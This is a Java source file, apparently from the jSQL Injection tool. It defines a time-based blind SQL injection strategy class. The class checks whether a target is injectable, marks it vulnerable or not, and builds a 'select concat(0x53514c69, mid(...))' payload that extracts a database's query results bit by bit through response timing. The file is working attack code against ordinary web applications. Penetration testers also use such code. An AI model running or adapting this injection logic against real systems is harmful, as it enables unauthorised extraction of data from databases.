package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.TimeInjection;

public class TimeStrategy implements IInjectionStrategy {
	private InjectionModel model;
	private TimeInjection time;
	private boolean isApplicable = false;
	
	public TimeStrategy(InjectionModel model){
		this.model = model;
	}
	
	@Override
	public void checkApplicability() throws PreparationException {
		model.sendMessage("Time based test...");
		
		time = new TimeInjection(model);
		isApplicable = time.isTimeInjectable();
		
		if(isApplicable)
			activate();
		else
			deactivate();
	}

	@Override
	public boolean isApplicable() {
        return isApplicable;
	}
	
	@Override
	public void activate() {
		Request request = new Request();
        request.setMessage("MarkTimebasedVulnerable");
        model.interact(request);
	}

	@Override
	public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedInvulnerable");
        model.interact(request);
	}

	@Override
	public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
		return time.inject("(" +
                "select+" +
	                "concat(" +
		                "0x53514c69," +
		                "mid(" +
			                "("+sqlQuery+")," +
			                startPosition+"," +
			                "65536" +
		                ")" +
	                ")"+
                ")", interruptable, stoppable);
	}

	@Override
	public void applyStrategy() {
		model.sendMessage("Using timebased injection...");
		model.applyStrategy(this);
		
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters("Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n");
        model.interact(request);
		
		Request request2 = new Request();
        request2.setMessage("MarkTimeStrategy");
        model.interact(request2);
	}
}
